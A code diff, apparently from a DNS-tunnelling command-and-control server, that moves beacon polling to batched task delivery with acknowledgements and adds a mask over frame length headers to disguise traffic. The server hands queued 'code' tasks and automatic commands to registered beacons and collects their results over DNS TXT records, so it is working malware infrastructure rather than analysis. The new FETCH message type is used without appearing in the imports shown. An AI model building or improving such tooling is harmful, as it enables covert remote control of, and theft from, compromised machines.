@@ -16,10 +16,10 @@ import threading
 import time
 
 from server.core.crypto import encode_frame, decode_frame
-from server.core.protocol import (REGISTER, RESULT, WELCOME, PONG, TASK,
-                                  validate_message)
+from server.core.protocol import (REGISTER, RESULT, WELCOME, PONG, TASKS,
+                                  frame_mask, validate_message)
 from server.sessions.engine import (
-    register_beacon, store_result, build_auto_tasks, InFlight,
+    register_beacon, store_result, build_auto_tasks, take_task_batch, InFlight,
 )
 
 _CACHE_TTL = 60.0     # 分片缓存存活上限（M2）
@@ -104,7 +104,8 @@ class _DnsServer:
 
     def _frame(self, msg: dict) -> bytes:
         payload = encode_frame(json.dumps(msg).encode("utf-8"), self._key)
-        return struct.pack(">I", len(payload)) + payload
+        # 长度头掩码(与 protocol.send_frame 一致,混淆长度分布)
+        return struct.pack(">I", len(payload) ^ frame_mask(self._key)) + payload
 
     def _handle(self, packet: bytes) -> bytes:
         parsed = parse_query(packet)
@@ -114,17 +115,13 @@ class _DnsServer:
         if len(labels) < 3:
             return build_txt_response(qid, labels, qtype, [b""])
 
-        # 轮询：poll.<bid>.<domain...>
+        # 轮询：poll.<bid>.<domain...>（v2 批量: 每次响应一批任务,取完继续轮询）
         if labels[0] == "poll":
             bid = labels[1]
-            resp = self._frame({"type": PONG})
             if bid and bid != "poll":
-                task = self._tq.pop(bid)
-                if task is not None:
-                    self._inflight.track(task)
-                    resp = self._frame(
-                        {"type": TASK, "task_id": task.task_id,
-                         "code": task.code})
+                resp = self._batch_response(bid, [])
+            else:
+                resp = self._frame({"type": PONG})
             return self._txt_response(qid, labels, qtype, resp, bid)
 
         # 响应分片拉取: r<idx>.<bid>.<domain...>（大响应改逐片拉取）
@@ -187,7 +184,7 @@ class _DnsServer:
                 for task in build_auto_tasks(self._config.auto_commands,
                                              bid2, self._dispatcher):
                     self._tq.push(bid2, task)
-            resp = self._frame({"type": WELCOME, "version": 1})
+            resp = self._frame({"type": WELCOME, "version": 2})
         elif msg.get("type") == RESULT:
             rp, pa = self._inflight.take(msg.get("task_id", ""))
             store_result(bid, msg.get("task_id", ""),
@@ -196,10 +193,32 @@ class _DnsServer:
                          self._config.max_result_size,
                          smods=self._smods, dispatcher=self._dispatcher,
                          result_processor=rp, proc_arg=pa)
-            resp = self._frame({"type": PONG})
+            # v2 批量: 逐条确认(acked=[该 task_id]) + 顺带领取一批新任务
+            resp = self._batch_response(bid, [msg.get("task_id", "")])
+        elif msg.get("type") == FETCH:
+            resp = self._batch_response(bid, [])
         else:
             resp = self._frame({"type": PONG})
         return self._txt_response(qid, labels, qtype, resp, bid)
+
+    def _batch_response(self, bid: str, acked: list) -> bytes:
+        """按预算领取一批任务 → TASKS 帧(acked 确认 + tasks 批量)。
+
+        无任务时: 有 acked 回空 TASKS 帧(确认必须送达), 否则 PONG。
+        """
+        budget = max(4096, int(getattr(self._config, "max_frame_size", 512 * 1024) * 0.8))
+        tasks = take_task_batch(bid, self._tq, budget)
+        if not tasks:
+            if acked:
+                return self._frame(
+                    {"type": TASKS, "tasks": [], "acked": list(acked)})
+            return self._frame({"type": PONG})
+        for t in tasks:
+            self._inflight.track(t)  # 登记 result_processor(无状态通道续传用)
+        return self._frame(
+            {"type": TASKS,
+             "tasks": [{"task_id": t.task_id, "code": t.code} for t in tasks],
+             "acked": list(acked)})
 
     def _txt_response(self, qid, labels, qtype, resp_frame: bytes,
                       bid: str = "") -> bytes:
